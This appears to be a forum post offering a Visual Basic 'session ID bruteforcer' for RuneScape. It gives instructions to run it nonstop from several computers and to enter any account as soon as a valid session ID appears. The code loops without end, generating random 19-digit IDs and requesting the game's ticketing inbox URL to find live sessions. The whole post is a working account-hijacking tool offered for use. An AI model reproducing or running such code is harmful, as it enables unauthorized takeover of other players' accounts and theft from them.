channel.title: [VB] Runescape SessionId Bruteforcer
channel.description:
How to use this: 1. Run it all day 2. Run it all night 3. Sit near the computer 4. Watch the immediate window, if a valid sid is found go into the account right away 5. Run it from 4 computers connected to the same router if you can (never reset your ip) 6. Make sure to close everything for performance purposes so more sids can be found.
[code]Private Sub tearnewasshole() Randomize Do Dim sUrl As String, crumb As String, src As String sUrl = "https://ticketing.runescape.com/id/" For i = 1 To 19 crumb = Int(10 * Rnd) sUrl = sUrl & crumb Next i sUrl = sUrl & "" src = Inet.OpenURL(sUrl & "/inbox.ws") If InStr(1, src, "expired") Then Debug.Print sUrl Else Debug.Print "Use:" & sUrl & "/inbox.ws" End If Loop While 1 = 1 End Sub[/code]
